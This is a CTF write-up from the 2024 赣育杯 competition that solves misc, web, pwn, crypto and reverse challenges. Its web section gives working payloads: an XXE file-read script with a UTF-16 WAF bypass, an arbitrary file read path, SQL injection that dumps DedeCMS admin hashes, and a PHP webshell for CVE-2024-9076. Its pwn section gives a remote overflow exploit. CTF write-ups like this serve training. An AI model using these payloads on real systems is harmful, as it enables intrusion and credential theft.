---
title: '2024 赣育杯 Writeup'
description: 'header 缺失字节，以及两个 stream length 计算错误，补齐头部 0d0a'
pubDate: 2024-09-15
author: 'IHK-1'
tags: ['CTF', '赣育杯', '2024']
---

# MISC
## Areurobot?（docker）
手速

<!-- 这是一张图片，ocr 内容为：ROOTL HELP VIEW FILE EDIT ACTIONS 大大大大大 FILE EDIT SEARCH VIEW DOCUMENT HELP YY*** ***** AAN ***** 大大大大大 WARNINGYOUARE (TRIANGLELSQUARELCIRCLE) > SQUARE SHAPE: SQUARE ANSWER:SQUARE PYZBAR R 1MPORT Q2:MATH? ### 出生日期日期出生 RT IMAGE 华华恭恭# ## ## ### ## ### ## #### ### 共共###### ## ## ## # HOM # ## ## ## ## ## ## ## T/DESKTOP/FLAGPNG" ### 开井  CALCULATION RESULTS > 28 2800 RESULT:2800 ANSWER:2800 Q3:QRCODE?  QRCODE CONTENT > HMYOYQJQUH RESULT: HMYOYQJQUH ANSWER:HMYOYQJQUH YOU ARE HUMAN! SANGFOR{5QGJJC4RPLBNVYN_XB3NPUWUCG94HRMT} (ROOTSKALI)-[~] -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1730009088840-dd1d6f41-86a7-4574-805c-08f7aec6f04b.png)

## AutoCAD
<!-- 这是一张图片，ocr 内容为：FAS FORMAT(DETAILS) 01234567 OFFSET E A B OD OA 20 46 41 53 34 2D FAS4-FILE 00000000 20 3B 20 4C45 4649 6F20 6E 6F 74 68 61 65 20 00000010 6E 67 6974 O NOT CHANGE IT! OD 0A 32 0D 0A 36 20 .42..6$.. 0 0 00 00000020 0905 00 35 01 00 03 04 09 00000030 33 03 00 53 3FAS45 3435 020200030A09 00000040 34 33 0100 35 0 02  02 38 3134 000316240D0A 20 20 00000050 TO 01 00 32 00 32 18 2A 39 00000060 TO 53 5B CO :S1 53 ARTUP. 41 52 54 55 50 00 00 01 00000070 00 0A 32 00 01 00 43  00 04 00 61 73 64 66 .2**9..U. 00 32 2A 2A 39 01 00 55 00000080 01 ASDF 55 01 00 08 00 6D 65 [SETVAR..U.. 5B 53 45 54 56 41 52 00 00000090 00 ME 000000A0 C45 52 54 00 55 01 6E 75 65 63 68 6F 5B 41 4C4 NUECHO[ALERT 00 43 00 00 06 00 0A 5C 000000BO 00 03 00 71 77 65 5C 00 00 00 32 00 5B 53 3A 3A 000000CO 53 54 41 52 54 55 50 OC TUP .2.[S:START 000000DO 43 03 00 01 00 1C 14 01 00 00 00 09 02 00 34 01 00 00 00 09 03 00 06 01 00 09 01 00 000000EO 57 00  A 16 16 00 2C  DB U.YAS.;FAS4 8A 0A 3B 61 73 34 20 E4 OE FF I 000000EO 63 6E 68 24 3B 41 37 2F 31 2F 0A 3B 00000100 CRUNCH.:$:A7/31/ 6372 75 02 00000110 30  32 STREAMLENGTH  SHOWS HOW MANY STRINGS A IN NUMBEROFSTRINGS THE ARE USED STREAM DEFINES THE STREAMRERMINATOR STREAMTERMINATORCHAR SHOWS THE END OF A STR STREAM STREAMTERMINATOR  DEFINES THE LENGTH OF THE KEY KEYLENGTH KEY TO DECRYPT THE KEYDATA STREAN FI1ESIGNATURE MAINSTREAM FUNCTIONSTREAM -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1730009123372-8ad793f4-1cfa-4bb5-9b60-707d89fd87bf.png)

参考文章分析

<!-- 这是一张图片，ocr 内容为：起始页 45B3E3698815A42A3275CB79A8C6A389 X 0123456789ABCDEF 93456789ABCDEF 120 46 41 5334 2D 46 49 4C 45 20 3B 20 44 6F 20 S4-FILE;DO 26E6F7420636868616E676E6765206974210DOA CHANGE IT!.. 3 34 34 0D 0A 35 20 24 14 00 00 5 $.....2.2. 00000032013202 44. 43502040003670E00000009( 90300350102 500030A570000000 01020003 00 090100350 $C/.AYS& 616240D0A3920 7 2F 05 C5 FD 9A AB 24C7 34 20 46 14 WAZL:SVOO 41 5A 4C 3B 53 76 F2 D3 703452D2B 18 57  8 2F 05 87 FD A8 A8 31 57 35 12 75 3E 69 28 06 1B /.*Y 1W5.U>1(. F2 81 5B 6A E4 90 CD 87 11 13 68 32 X.B$O.[JA.I+..H2 9580A6224 6B 6F 7E 2A 43 10 A9 83 7C 4D 8A BE 1015713064 QODKO~*C.OF|MS% 07 3B 47 47 22 7F 60 5D 62 79 58 <D\.:GG". ]BY.X 11A8AB645C 12 9E83 5B 71 FC AD EB F2 61 24 33 5A ZF[QU-EOA$3Z$BRS 5A 24 42 72 53 DGJ,R"EAN:A F7 BO F7 C1 5D 20 13 5F 44 47 6A 2C 52 93 EB 41 6E F7 B OD 0B 31F88F2E04 \/G....X..G10.. 14 5C 2F 47 11 07 58 76 53 43 11 3D 1A 4E 08 15 F6 FD F3 ED 77 1C 46 22 OYOIW.F"VSC. 三,N. 166230F2CF3A05C4FD BOOR:AY C31.EG. A8A2335D 0D454714 2E 12 16 C9 1A 34 C.....C100...E.4 31 FB D2 2E 1 1743110E18 OD  0D 63 1 73 34 20 63 75 6E 63 OA3B6666173 00.I.:FAS4 CRUNC 1830F409A1 3B 41 36 2F 31 36 2F 32 32 19 68 0A 3B 24 3B 4 H.;$;A6/16/22 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1730009167328-4f766087-af0c-4b23-8f59-9eba5525be9a.png)

header 缺失字节，以及两个 stream length 计算错误，补齐头部 0d0a

计算stream length1 ：16 * 2 + 7 +1 = 42

<!-- 这是一张图片，ocr 内容为：起始页 45B3E3698815A42A3275CB79A8C6A389 X 0123456789ABCDEF 23456789ABCDEF 120 46 41 5334 2D 46 49 4C 45 20 3B 20 44 6F 20 FAS4-FILE;DO 26E6F7420636861 616E6765206974210DOA NOT 334340DOA3520 2024140000000320132013202 44 435020400367 0E00000090300350102 500030A57000 00000901003501020003 342024 C7 2F 05 FD 9A AB 616240D0A3920 .AYSK 703452D2B46 57 41 5A 4C 3B 53 76 F2 D3 WAZL;SVOO 18 14 8 2F 05 87 FD A8 A8 31 57 35 12 75 3E 69 28 06 1B 1.. 315 1W5.U>I(.. 9 58 0A 62 6A E4 90 CD 87 11 13 68 32 X.B$O.[JA.IT...H2 24 F281 5B 10 15 71 30 64 7E 2A 43 10 A9 83 7C 4D 8A BE 6B6F QODKO~*C.OFMS% 47 47 22 7F 60 50 62 79 58 11A8AB645C07 3B &D\.:GG". ]BY.X FC AD 129E83 5B 71 F EB F2 61 24 33 5A 24 42 72 53 ZF[QU-EOA$3Z$BRS 93 EB 41 6E F7 BO F7 C1 5D 20 C 52 DGJREAN-A 13 5F 44 47 6A 2C 5 580DOB6731F88F2E04 14 5C 2F 47 11 07 07 58 0 \/G....X..G10... 46 22 76 53 43 11 3D 1A 4E 08 15 F6 FD F3 ED 77 1C OYOIW.F"VSC.N. 16 62 30 F2 CF 3A 05 C4 FD A8 A2 33 5D OD 45 47 14 B0OI:.AY C3].EG. C1UO...E.4 63 3 3 31 FB D2 2E 12 16 C9 1A 34 1743110E180DOD C.. 666173342063 18 30 F4 09 A1 0A 06372756E63 00. :FAS4 CRUNC 0A3B 36 2F 3 31362F323 32 19 68 0A 3B 24 3B 41 H.;$:A6/16/22 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1730009273910-dfd84c4b-9a14-40cc-b95d-6d196cf64ad9.png)

计算stream length2 : 11 * 16 = 176 具体在 176 左右，由于给了一位 9 ，补齐179 即可

<!-- 这是一张图片，ocr 内容为：45B3E3698815A42A3275CB79A8C6A389X 起始页 0123 0123456789ABCDEF 56789ABDEDEF 34 2D 46 49 4C 45 20 3B 120464153 DO FAS4-FILE 20 44 6F 20 6368616E 2 6E 6F 74 20 67652069 IT! 74210DOA NOT CHANGE 000000032013202 334340DOA 35 20 24 14 44..5 0000090300350102 03670E00 435020400 5, 500030A57 0000000090100350 5 501020003 61624 0D OA SCL.AVS& 39 20 34 0342024C72F05C5FD9AB 703452D2B 46 14 18 E-+F..WAZL;SVOO 1857415A4C3B 3B53 76 F2 D3 .TY"1W5.U>I(.. 82F0587FD A8 A8 31 57 35 12 75  3E6928061B B$O.CJA.IF..H2 24 F281 5B 9580A62 5B6AE490CD871136832 6B6F7E2A4310A9837C4D8ABE 101571306 64 QODKO~*C.OF|MS% 3B 47 47 22 7F 60 5D 62 79 58 07 11A8AB645C NDL.:GG".JBY.X 12 9E 83 5B 71 FC AD EB F2 61 24 33 5A A2427253 F[QU-EOA$3Z$BRS 13 5F 44 47 6A 2C 52 93 EB 41 6E F7 BO F7 C1 5D 20 DGIREAN:A 14 5C 2F 47 14 1F1107580D0B6731F88F2E04 /G. G10.. 15 F6 FD F3 ED 77 1C 46 22 76 53 43 11 3D 1A 4E 08 OYOIW.F"VSC.N 600I:AY C3].EG. 0 A8 A2 33  45 47 14 3A 05 C4 05 C4 05 C4 05 05 05 C4 05 C4 0 166230F2CF OD OD 63 31 FB D2 12 16 16C91A34 1743110E18 00.I.:FAS4 CRUNC 72756E63 1830F409A1 0A3B 66617334206372 24 2F 32 32 3136 36 2F 19680A3B 3B41 H.:$:A6/16/22 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1730009335361-39e05786-6f6f-46ef-8cee-98684be1ac1f.png)

完整如下：

<!-- 这是一张图片，ocr 内容为：起始页 45B3E3698815A42A3275CB79A8C6A389 45B3E3698815A42A3275CB79A8C6A389.FAS X 0123456789ABCDEF 0123456789ABCDEF 1 DD OA 20 46 41 53 34 2D 46 4C 4C 45 20 3B 20 44 .  FAS4-FILE ; D 26F206E6F74206368 61 6E 65 20 69 74 21 NOT CHANGE IT! O 30D0A3432 241400000003201 OD OA 35 20 .42..5 $.....2. 432023502 2.5, 0E0000009030035 04000367 .G......5 00350102 00 00 010 501020003 OA 57 00  .$..179 4 $C/. 39 20 34 20 24 C7 2F 05 600031624 OD OA3137 AYS&.E-+F..WAZL; 8 46 14 18 57 41 5A 4C 3B 7C5FD9AAB 0345 2D 2B 46 2F 05 85376F2 D3 SVOO/.#Y*1W5.U> 87 FD A8 A8 31 57 35 12 75 3E I(..X.B$O.[JA.I+ 96928061B 58 0A 62 24 F2 81 5B 6A E4 90 CD 87 1011136832 .H2.Q0DKO~*C.OF 15 71 71 30 64 6B 6F 7E 2A 43 10 A9 83 5C 07 3B 47 47 22 7F 60 5D MS名&D\.:GG". 117C4D8ABEABAB6 71 FC AD EB F2 61 24 33 5A BY.XZF[QU-EOA$3Z 12 62 79 19 58 9E 83 5B 71 13 24 42 72 53 5F 44 47 6A 2C 52 93 EB 41 6E F7 BO $BRS DGJ,R"EAN -A] \/G...X...G1 41F1107580D0B6731 14 F7 C1 5D 20 5C 2F 47 14 1F 15 F8 8F 2E 04 F6 FD F3 ED 77 1C 46 22 76 0...OYOIW.F"VSC. 76534311 16 3D 1A 4E 08 62 30 F2 CF 3A 05 C4 FD A8 A2 33 5D -N.B0OI:.AY C3] 17 0D 45 47 14 43 11 0E 18 OD OD 63 31 FB D2 2E 12 .EG.C.. .C1UO.. .E.406. 1816C91A3430F409A10 :FAS4 C OA3B666173342063 3B 41 36 2F 31 36 2F 32 1972756E63680A3B243B2438 RUNCH.;$:A6/16/2 2 20 32 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1730009383930-df8a7bf1-000a-4905-98e2-8595d78a9f8a.png)

使用 fas2lsp ，得到 flag

<!-- 这是一张图片，ocr 内容为：X 45B3E3698815A42A3275CB79A8C6A 查看 编辑 文件 04/                                                           03 / "SANGFORFILPUU8PCYPY4HCV1BX JANCA8OJ3MJLY" 02/PRINC 01/"RUN ME,NO RESULTS!!!!" -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1730009413099-d6a3e1f2-3083-4a40-b4b0-268f464d8a3f.png)

# WEB
## web1
xxe注入，waf用UTF-16绕过即可：

```python
import requests

url = 'http://bmljkqlnz8vri0c4.ctfw.edu.sangfor.com.cn/exploit.php'
data = """<!DOCTYPE lit[
    <!ELEMENT test ANY>
    <!ENTITY test SYSTEM "file:///flag">
    ]>
<result><code>&test;</code><msg>wu</msg></result>"""

re = requests.post(url ,data=data.encode('utf-16'))
print(re.text)
```

## web2
任意文件读取，下载pdf用010editor打开即可。

```plain
demo1/pubfunc/previewpdf?filepath=/flag
```

## web3
前台sql注入：在`plus/check.php`中的id参数存在注入，waf用换行绕过即可。

```plain
union%0Aselect 1,group_concat(pwd)%0Afrom%0Adede_admin -- 
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://raw.githubusercontent.com/guangjiovo/picgo/main/202410271619099.png)

cmd5付费拿到密码`tianwei123A`。

后台getshell：**CVE-2024-9076**（`article_string_mix.php`）。

```plain
$cmd = '_POST';
${$cmd}[1](${$cmd}[0]);
```

执行命令（`/data/downmix.data.php`）：

<!-- 这是一张图片，ocr 内容为： -->
![](https://raw.githubusercontent.com/guangjiovo/picgo/main/202410271617078.png)

# PWN
## OF
溢出覆盖

```plain
from pwn import *
from ctypes import *
from struct import pack
banary = "./of"
elf = ELF(banary)
# libc = ELF("./libc.so.6")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
ip = 'ctfx.edu.sangfor.com.cn'
port = 41440
local = 0
if local:
    io = process(banary)
else:
    io = remote(ip, port)

context(log_level = 'debug', os = 'linux', arch = 'amd64')
#context(log_level = 'debug', os = 'linux', arch = 'i386')

def dbg():
    gdb.attach(io)
    pause()

s = lambda data : io.send(data)
sl = lambda data : io.sendline(data)
sa = lambda text, data : io.sendafter(text, data)
sla = lambda text, data : io.sendlineafter(text, data)
r = lambda : io.recv()
ru = lambda text : io.recvuntil(text)
uu32 = lambda : u32(io.recvuntil(b"\xff")[-4:].ljust(4, b'\x00'))
uu64 = lambda : u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
iuu32 = lambda : int(io.recv(10),16)
iuu64 = lambda : int(io.recv(6),16)
uheap = lambda : u64(io.recv(6).ljust(8,b'\x00'))
lg = lambda data : io.success('%s -> 0x%x' % (data, eval(data)))
ia = lambda : io.interactive()

sl(b'A'*0x52+p32(0xc8e51295))  

ia()
```

# CRYPTO
## Random-dlp
randomlist相当于给出20组992bit的数据。加上128bit的g足以恢复随机数

但是randomlist[0]和randomlist[1]不是直接给出random相关的值

要利用randomlist[0]和randomlist[1]分解数据。

然后用extend_mt19937的板子回溯即可

exp：

```plain
from extend_mt19937_predictor import ExtendMT19937Predictor 
import sys 
sys.setrecursionlimit(3000)

f = open("output.txt",'r').readlines()
p = eval(f[0])
g = eval(f[1])
c = eval(f[2])

random_list = eval(f[3])

# 分解
N = random_list[0]
gift = random_list[1]

def fac(p,q): 
    if len(p) == 1024:
        pp = int(p,2)
        if N % pp == 0:
            print(f"num1 = {pp}")
            print(f"num2 = {N // pp}")
    else:
        l = len(p)
        pp = int(p,2)
        qq = int(q,2)
        if (pp ^ qq) % (2 ** l) == gift % (2**l) and pp * qq % (2**l) == N % (2**l):
            fac('1' + p,'1' + q) 
            fac('0' + p,'1' + q) 
            fac('1' + p,'0' + q) 
            fac('0' + p,'0' + q) 

# fac('1','1')

num1 = 127954378905954473979599580543506133734470934402921187567126328044915399136783613004594347893231249786782113863929878799565038392492182148282608301947643527866047185811106214065159313666530775740342170598378474744062316856449855121227117986037506212272472581097517909639356259473022026193056598279705883312493
num2 = 39590745269613494512251071983478757508814280272882049594849029032543594900913069786771939178626302619505593605829896534613681707527396968070583148545044036306348014204000427687094161885558852315374684881011665955520787218713536145424007912730740353898075406161865607017294126568950247058934097741037059441349

tmp = [num1,num2] + random_list[2:]
D = [] 
for i in range(len(tmp)):
    D.append(tmp[i] >> 32)

predictor = ExtendMT19937Predictor() 

predictor.setrandbits(g,128)
for i in range(len(D)):
    predictor.setrandbits(D[i],992)

for i in range(len(D)):
    predictor.backtrack_getrandbits(992)

predictor.backtrack_getrandbits(128)
predictor.backtrack_getrandbits(32)

m = predictor.backtrack_getrandbits(128)
flag = b'Sangfor{'+str(m).encode()+b'}'
print(flag)
```

# REVERSE
## 勒索病毒
secret.enc文件里面直接有flag

<!-- 这是一张图片，ocr 内容为：YOULINQUBUNTU:/MNT/HGTS/PWN赵/赣直/RES CD 1 YOULINQUBUNTU:/MNT/HGFS/PWN题/赣育/RE/1S LS CHALLENGE PUBLIC.KEY.PEM SECRET1.ENC SECRET2.ENC YOULINQUBUNTU:/MNT/HGFS/PWN题/赣育/RE/1S CAT SECRET1.ENC BUNTU:/MNT/HGFS/PWN题/赣育/RE/1S CAT SECRET2.ENC EKEY焦爽KEDZ004J000000]06 4 LAG: SANGFOR-DD784749-CF76-4F05-87E6-4A2626263E6517YOULINQULINQUNTU://NNT/HGFS/PWN题/鞋育/RE/15 -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1730016899099-fc9639e9-64c6-4d15-89f7-c64f2cc80388.png)

## level3
使用dumpdex 工具 成功脱壳

看到里面的是迷宫 然后使用 dfs 跑maze

```plain
#include <stdio.h>
#include <stdbool.h>

#define N 11
#define M 11

char maze[12][12] = {
    "###########",
    "#****#****#",
    "#*#*###*#*#",
    "#*#*****#*#",
    "#*#######*#",
    "#*#*******#",
    "#*#*#*#*#*#",
    "#*#*#*#*#*#",
    "###*#*#*###",
    "#***#*#**$#",
    "###########"
};

bool visited[N][M];
char path[100]; // 用于记录路径
int pathIndex = 0;

// Directions for movement: W (up), A (left), S (down), D (right)
int dir[4][2] = { {-1, 0}, {0, -1}, {1, 0}, {0, 1} };
char dirChar[4] = { 'w', 'a', 's', 'd' };

// Function to check if a cell is valid
bool isValid(int x, int y) {
    return (x >= 0 && x < N && y >= 0 && y < M && maze[x][y] != '#' && !visited[x][y]);
}

// DFS function
bool dfs(int x, int y) {
    // Mark the cell as visited
    visited[x][y] = true;
    path[pathIndex++] = '\0'; // Current path end
    
    // Check if we reached the goal
    if (maze[x][y] == '$') {
        return true;
    }
    
    // Explore all four directions
    for (int i = 0; i < 4; i++) {
        int newX = x + dir[i][0];
        int newY = y + dir[i][1];
        
        if (isValid(newX, newY)) {
            path[pathIndex - 1] = dirChar[i]; // Record the move
            if (dfs(newX, newY)) {
                return true; // If we found a path to the goal
            }
        }
    }
    
    // Backtrack
    visited[x][y] = false;
    pathIndex--; // Remove the last move from the path
    return false;
}

int main() {
    // Start DFS from (1, 1)
    if (dfs(1, 1)) {
        printf("Path to the goal found: ");
        for (int i = 0; i < pathIndex; i++) {
            printf("%c", path[i]);
        }
        printf("\n");
    } else {
        printf("No path to the goal.\n");
    }
    return 0;
}
```

跑出路径之后用md5加密一下

<!-- 这是一张图片，ocr 内容为：YOULIN@UBUNTU:/MNT/HGFS/PWN题/赣育/RE/2$ ./EXP PATH TO THE GOAL FOUND: DDSSDDDDDWWDDSSSSSSSSSDD YOULIN@UBUNTU:/MNT/HGFS/PWN题/赣育/RE/2$ -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1730016898626-5440a226-4055-463f-aa77-de5429eeb58a.png)

![]()

套下flag格式就行了

## Nano
通过输出判断 可以把所有条件 都去输入进去来满足条件

exp:

```plain
from multiprocessing import Pool
import subprocess

# 定义生成 flag 的函数
def create_flag(i, j, k, l, m, n, v, x):
    return f'Sangfor{{{i}{j}-{k}-{l}-{m}-{n}{v}{x}}}'

# 定义处理每个 flag 的函数
def check_flag(flag):
    process = subprocess.Popen(['./nanobot'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    output, _ = process.communicate(input=(flag + '\n').encode())
    
    if b'Well done~' in output:
        print(f'Found flag: {flag}')
        process.kill()  # 找到 flag 后终止进程
    else:
        process.kill()  # 终止进程

# 列出所有可能的值
a1 = ['f9a0', 'fc75', '6875']
a2 = ["943d", "1ab3", "1a50", "1e40"]
a3 = ["d19b", "bd69", "b1d8", "b013", "dea6"]
a4 = ["d19b", "bd69", "b1d8", "b013", "dea6"]
a5 = ["943d", "1ab3", "1a50", "1e40"]
a6 = ["943d", "1ab3", "1a50", "1e40"]
a7 = ["c690", "366f", "c239", "c31e"]
a8 = ["c690", "366f", "c239", "c31e"]

# 创建所有可能的 flag
flags = [create_flag(i, j, k, l, m, n, v, x) for i in a1 for j in a2 for k in a3 for l in a4 for m in a5 for n in a6 for v in a7 for x in a8]

# 创建进程池，设置最大进程数为 8
with Pool(processes=8) as pool:
    pool.map(check_flag, flags)  # 使用池中的进程并行处理 flag

```

<!-- 这是一张图片，ocr 内容为：YOULINQUBUNTU:/MNT/HGFS/PWN题/赣育/RE/3S PYTHON EXP.PY FLAG: SANGFOR{F9A01A50-BD69-D19B-1AB3-1E40C690C31E] FOUND -->
![](https://cdn.nlark.com/yuque/0/2024/png/35229002/1730016897724-3d91357d-abb8-456c-b0c7-a619bca9c5a6.png)

